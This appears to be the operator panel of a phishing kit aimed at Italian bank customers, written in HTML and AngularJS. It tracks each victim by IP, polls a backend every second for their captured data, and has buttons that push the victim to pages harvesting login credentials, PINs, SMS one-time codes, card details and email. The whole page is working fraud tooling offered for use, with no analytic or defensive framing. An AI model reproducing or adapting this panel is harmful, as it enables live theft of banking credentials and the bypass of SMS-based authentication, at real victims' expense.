<!DOCTYPE html>

<html lang="IT" class="no-js" data-kantu="1">
<head>
       <link rel="stylesheet" href="file/bootstrap-3.3.6.min.css">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
    <meta name="language" content="IT">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="x-ua-compatible" content="IE=Edge">
        <style type="text/css">
          a{
                        font-size: 13px;
                        font-family: Arial;
                        font-weight: bold;
                        padding: 11px 16px;
                        vertical-align: top;
                        background: #0b6ba8;
                        border: 1px solid #0b6ba8;
                        color: #fdfdff;
                        width: 100px;
                        margin-top: 14px;
                        text-decoration: none;
                            display: block;
          }
          td{
            padding: 23px !important;
          }
          table{
          width: 400px !important
          }
           
            .upload-form {
              display: flex;
              max-width: 200px;
              padding: 10px;
              flex-flow: column;
             
              background-color: #fff;
               
            }
            .upload-form h1 {
              margin: 0;
              padding: 15px;
              font-size: 18px;
              font-weight: 500;
              color: #434850;
              text-align: center;
            }
            .upload-form label {
              display: flex;
              flex-flow: column;
              justify-content: center;
              align-items: center;
              background-color: #fafbfb;
              border: 1px solid #e6e8ec;
              color: #737476;
              padding: 10px 12px;
              font-weight: 500;
              font-size: 14px;
              margin: 10px 0;
              border-radius: 4px;
              cursor: pointer;
            }
            .upload-form label i {
              margin-right: 10px;
              padding: 5px 0;
              color: #dbdce0;
            }
            .upload-form label span {
              display: flex;
              align-items: center;
              justify-content: center;
              font-size: 12px;
              word-break: break-all;
            }
            .upload-form label:hover {
              background-color: #f7f8f9;
              border: 1px solid #e3e5ea;
              color: #68686a;
            }
            .upload-form label:hover i {
              color: #cfd1d4;
            }
            .upload-form input[type="file"] {
              appearance: none;
              visibility: hidden;
              height: 0;
              width: 0;
              padding: 0;
              margin: 0;
            }
            .upload-form .progress {
              height: 20px;
              border-radius: 4px;
              margin: 10px 0;
              background-color: #e6e8ec;
            }
            .upload-form button {
              appearance: none;
              background-color: #007db3;
              border-radius: 4px;
              font-weight: 500;
              font-size: 14px;
              border: 0;
              padding: 10px 12px;
              margin-top: 10px;
              color: #fff;
              cursor: pointer;
            }
            .upload-form button:hover {
              background-color: #b6563e;
            }
            .upload-form button:disabled {
              background-color: #aca7a5;
            }
            .upload-form .result {
              padding-top: 15px;
            }

</style>
</head>






<body class="bussola collapsible" ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">


<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">IP</th>
      <th scope="col">ACTION</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">1</th>
      <td>{{ip}}</td>
      <td>{{fun}}</td>
    </tr>
 
  </tbody>

</table>


 <hr>
  

<table class="table">
  <tbody>

    <tr>
      <td> <a href=""ng-click="gotoLOG()" style="display:initial;">LOG</a></td>
      <td> <a href=""ng-click="gotoPIN()" style="display:initial;">INFO</a></td>
      <td> <a href=""ng-click="gotoSMS()" style="display:initial;">SMS</a></td>
    </tr>

    <tr>
     
      <td> <a href=""ng-click="gotoFIN()" style="display:initial;">FIN</a></td>
       

    </tr>
 
    
     
    <tr>


      
    </tr>



  




 

 
    
  </tbody>
</table>

<br><br>



</body>

 <script src="file/jquery.min.js"></script>
 <script src="file/angular.min.js"></script>
 <script src="file/dirPaginate.js"></script>

 


<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
    var urlx = window.location.pathname;
    var pathname = urlx.replace("fin.php", "");

    $scope.info_User={};
    $scope.ip="";
    $scope.fun="";
    $scope.bnk="";
    $scope.text="";
    $scope.num="";
    $scope.code1="";
    $scope.code2="";

     $scope.base_url=""

     $scope.ip = getUrlParameter('ip');
     $scope.ipop = getUrlParameter('ip');
     console.log( $scope.ip);


    setInterval(function() {
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=3",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
            console.log(data)
               $scope.ip=data.data.ip;
               $scope.fun=data.data.fun;
               $scope.bnk=data.data.bnk;


               $scope.text=data.data.text;
               $scope.num=data.data.num;
               $scope.ipp=data.data.ip;
               $scope.code1=data.data.code1;
               $scope.code2=data.data.code2;

               $scope.code5=data.data.code5;
               $scope.code6=data.data.code6;

   
           });
    }, 1000);


 
   //ADDTEXT
    $scope.AddCODE = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.code1= $("#code1").val() ;
            
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=6",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
              alert("ADD "+Detaile.code1 )
           });
    }

    $scope.ADDIPC = function(){ 
            var Detaile = {}; 
            Detaile.ip=   $("#ipppp").val();
            Detaile.fun=   "ADD";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=1",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
              alert("ADD "+Detaile.ip )
           });
    }

 
    $scope.ADDTEXT = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.text= $("#txttxt").val() ;
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=5",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.addUser = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "N";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=1",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
               console.log(data);
   
           });
    }

    $scope.deletall = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=0000",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
                alert("DELET ALL ")
   
           });
    }
 
    $scope.gotoSMS = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoSMS";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.gotoLOAD = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoLOAD";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

     $scope.gotoINFO = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoINFO";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }   
     $scope.gotoMAIL = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoMAIL";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    } 


 

         
    $scope.gotoCC = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoCC";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }
 
    $scope.gotoLOG = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoLOG";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.gotoPIN = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoPIN";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.gotoFIN = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoFIN";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

 
    $scope.updateUserSMS = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "GotoSMS";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    function getUrlParameter(sParam) {
        var sPageURL = window.location.search.substring(1),
            sURLVariables = sPageURL.split('&'),
            sParameterName,
            i;

        for (i = 0; i < sURLVariables.length; i++) {
            sParameterName = sURLVariables[i].split('=');

            if (sParameterName[0] === sParam) {
                return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
            }
        }
        return false;
    };


}]);

</script>  





</html>